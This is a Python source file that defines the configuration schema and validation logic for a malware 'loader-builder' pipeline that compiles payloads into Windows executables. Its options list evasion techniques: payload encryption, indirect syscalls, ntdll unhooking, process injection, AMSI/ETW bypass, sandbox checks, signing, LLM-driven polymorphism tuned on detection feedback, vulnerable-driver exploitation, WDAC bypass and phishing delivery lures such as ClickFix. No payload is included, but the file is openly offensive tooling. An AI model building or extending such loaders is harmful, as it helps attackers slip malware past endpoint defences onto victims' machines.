"""Recipe model for the loader-builder module.

A Recipe is the intermediate state that flows through atomic pipeline functions.
Each atomic function reads a recipe.json, mutates one field, returns recipe.json.
The terminal `compile_loader` function consumes the recipe and produces a PE.
"""
from __future__ import annotations

import base64
import hashlib
import json
import secrets
from dataclasses import dataclass, field, asdict
from typing import Any

RECIPE_SCHEMA_VERSION = 1


@dataclass
class Encryption:
    algorithm: str = "aes256_ctr"        # aes256_ctr | aes256_cbc | chacha20 | rc4 | xor_rolling
    key_b64: str = ""                    # 32 bytes for AES-256
    iv_b64: str = ""                     # 16 bytes for AES-CTR


@dataclass
class Encoding:
    type: str = "raw_bytes"              # raw_bytes | uuid_strings | ipv4_strings | ipv6_strings | mac_strings | sgn


@dataclass
class SyscallLayer:
    method: str = "winapi_only"          # winapi_only | indirect_hellshall | indirect_tartarus | indirect_recycledgate


@dataclass
class Unhook:
    method: str = "none"                 # none | peruns_fart | perun_selective | phantom_dll_hollow | manual_ntdll_remap


@dataclass
class Injection:
    target: str = "self"                 # self | early_cascade | poolparty_tp_timer | early_bird_apc | threadless_ntdispatcher | module_stomping | process_ghosting
    target_process: str = ""             # only used if target != self
    ppid_spoof: str = ""
    block_non_ms_dlls: bool = False
    spawn_via_ntcreateuserprocess: bool = False


@dataclass
class StackSpoof:
    method: str = "none"                 # none | loudsunrun | silentmoonwalk | dreamwalkers


@dataclass
class Sleep:
    technique: str = "none"              # none | ekko | cronos | zilean | deathsleep
    sleep_api: str = "sleep"             # sleep | ntdelayexecution | waitforsingleobject | tpsetwait | tpalloctimer_chain


@dataclass
class EtwAmsiBypass:
    etw_method: str = "none"             # none | patchless_hwbp | etweventwrite_ret_patch
    amsi_method: str = "none"            # none | patchless_hwbp | amsi_scan_buffer_patch | amsi_write_raid
    etw_decoy_injection: bool = False


@dataclass
class MemoryStrategy:
    protection: str = "rw_then_rx"       # rw_then_rx | execute_only | no_alloc_module_stomp
    fluctuation: bool = False            # ShellcodeFluctuation


@dataclass
class ExecutionOnly:
    enabled: bool = False
    target_dll: str = ""                 # e.g. msys-2.0.dll


@dataclass
class ApiHashing:
    algorithm: str = "fnv1a"             # djb2 | fnv1a | crc32 | random_per_build
    random_seed: bool = True


@dataclass
class AntiAnalysis:
    checks: list[str] = field(default_factory=list)  # debugger,vm,sandbox,domain_lock,hostname_lock,geo_lock,sleep_jitter,mouse_check
    guardrail_sid: str = ""
    guardrail_hostname_hash: str = ""


@dataclass
class Obfuscation:
    passes: list[str] = field(default_factory=list)  # cff,bogus_cf,sub,split,string_enc
    anti_emulation: bool = False


@dataclass
class PePolish:
    options: list[str] = field(default_factory=list)  # strip_pdb,strip_timestamps,strip_rich_header,randomize_section_names,randomize_imports,fake_resources
    clone_version_info_from_b64: str = ""             # base64 PE bytes to copy VS_VERSION_INFO from


@dataclass
class Signing:
    mode: str = "none"                   # none | self_signed | use_pfx
    pfx_b64: str = ""
    pfx_password: str = ""
    timestamp_server: str = "http://timestamp.digicert.com"


@dataclass
class Compiler:
    toolchain: str = "mingw_gcc"         # msvc | mingw_gcc | clang_msvc | nim | rust
    language: str = "c"                  # c | cpp | nim | rust


@dataclass
class Polymorphism:
    mode: str = "seed_only"              # none | seed_only | llm_rewrite | llm_per_function | llm_adversarial
    llm_endpoint: str = "http://localhost:11434/v1"
    llm_model: str = "qwen2.5-coder:14b"
    llm_api_key: str = ""
    llm_detection_feedback: str = ""


@dataclass
class Byovd:
    enabled: bool = False
    driver_b64: str = ""
    exploit_template: str = ""           # rtcore64 | kdmapper | gdrv | ene_iohlp | huawei_audio | custom


@dataclass
class BootEvasion:
    method: str = "none"                 # none | edrstartuphinder_service | edr_redir_v2_bindlink


@dataclass
class WdacBypass:
    strategy: str = "none"               # none | teams_legacy_node_load | imgmgr_deserialize | msbuild_inline | dll_sideload_signed_app | browser_exploit_pivot


@dataclass
class DeliveryLure:
    type: str = "none"                   # none | clickfix_powershell | clickfix_mshta | lnk_motw_bypass | signed_app_hijack_pack | html_smuggling | svg_smuggling | onenote_hta
    url: str = ""                        # URL where the loader will be hosted


@dataclass
class VbsHvciPolicy:
    policy: str = "proceed"              # proceed | degrade_userland_only | refuse_silent_exit


@dataclass
class Payload:
    bytes_b64: str = ""
    sha256: str = ""
    size: int = 0
    type: str = "raw_shellcode"          # raw_shellcode | pe_binary | dotnet_assembly | bof_object | zip_bundle


@dataclass
class Recipe:
    schema_version: int = RECIPE_SCHEMA_VERSION
    seed: int = 0
    payload: Payload = field(default_factory=Payload)
    encryption: Encryption = field(default_factory=Encryption)
    encoding: Encoding = field(default_factory=Encoding)
    api_hashing: ApiHashing = field(default_factory=ApiHashing)
    syscall_layer: SyscallLayer = field(default_factory=SyscallLayer)
    unhook: Unhook = field(default_factory=Unhook)
    injection: Injection = field(default_factory=Injection)
    stack_spoof: StackSpoof = field(default_factory=StackSpoof)
    sleep: Sleep = field(default_factory=Sleep)
    etw_amsi: EtwAmsiBypass = field(default_factory=EtwAmsiBypass)
    memory: MemoryStrategy = field(default_factory=MemoryStrategy)
    execution_only: ExecutionOnly = field(default_factory=ExecutionOnly)
    anti_analysis: AntiAnalysis = field(default_factory=AntiAnalysis)
    obfuscation: Obfuscation = field(default_factory=Obfuscation)
    pe_polish: PePolish = field(default_factory=PePolish)
    signing: Signing = field(default_factory=Signing)
    compiler: Compiler = field(default_factory=Compiler)
    polymorphism: Polymorphism = field(default_factory=Polymorphism)
    byovd: Byovd = field(default_factory=Byovd)
    boot_evasion: BootEvasion = field(default_factory=BootEvasion)
    wdac_bypass: WdacBypass = field(default_factory=WdacBypass)
    delivery_lure: DeliveryLure = field(default_factory=DeliveryLure)
    vbs_hvci: VbsHvciPolicy = field(default_factory=VbsHvciPolicy)

    def to_dict(self) -> dict:
        return asdict(self)

    def to_json(self) -> str:
        return json.dumps(self.to_dict(), indent=2)

    @classmethod
    def from_dict(cls, data: dict) -> "Recipe":
        # Build nested dataclasses from plain dict, resolving forward-ref strings.
        import typing
        def _build(dc_cls, source: Any):
            if source is None:
                return dc_cls()
            if isinstance(source, dc_cls):
                return source
            hints = typing.get_type_hints(dc_cls)
            kwargs = {}
            for f in dc_cls.__dataclass_fields__.values():
                if f.name not in source:
                    continue
                v = source[f.name]
                ftype = hints.get(f.name, f.type)
                if hasattr(ftype, "__dataclass_fields__"):
                    kwargs[f.name] = _build(ftype, v)
                else:
                    kwargs[f.name] = v
            return dc_cls(**kwargs)

        return _build(cls, data)

    @classmethod
    def from_json(cls, raw: str) -> "Recipe":
        return cls.from_dict(json.loads(raw))


def new_seed() -> int:
    """Cryptographically random seed for per-build mutation."""
    return secrets.randbits(64)


def init_from_payload(payload_bytes: bytes, payload_type: str) -> Recipe:
    r = Recipe()
    r.seed = new_seed()
    r.payload.bytes_b64 = base64.b64encode(payload_bytes).decode("ascii")
    r.payload.sha256 = hashlib.sha256(payload_bytes).hexdigest()
    r.payload.size = len(payload_bytes)
    r.payload.type = payload_type
    return r


def validate(recipe: Recipe) -> list[str]:
    """Returns list of error strings. Empty list = valid."""
    errors: list[str] = []
    if not recipe.payload.bytes_b64:
        errors.append("payload.bytes_b64 missing — call init_recipe first")
    if recipe.payload.size <= 0:
        errors.append("payload.size must be > 0")
    if recipe.encryption.algorithm == "aes256_ctr":
        # key/iv are filled by compose() if empty. Only validate length when present.
        if recipe.encryption.key_b64:
            try:
                key = base64.b64decode(recipe.encryption.key_b64)
                if len(key) != 32:
                    errors.append(f"AES-256 needs 32-byte key, got {len(key)}")
            except Exception as e:
                errors.append(f"encryption.key_b64 decode failed: {e}")
        if recipe.encryption.iv_b64:
            try:
                iv = base64.b64decode(recipe.encryption.iv_b64)
                if len(iv) != 16:
                    errors.append(f"AES-CTR needs 16-byte IV, got {len(iv)}")
            except Exception as e:
                errors.append(f"encryption.iv_b64 decode failed: {e}")
    if recipe.compiler.toolchain not in {"mingw_gcc", "msvc", "clang_msvc", "nim", "rust"}:
        errors.append(f"unknown compiler.toolchain={recipe.compiler.toolchain}")
    if recipe.injection.target != "self" and not recipe.injection.target_process:
        errors.append("injection.target_process required when injection.target != self")
    return errors
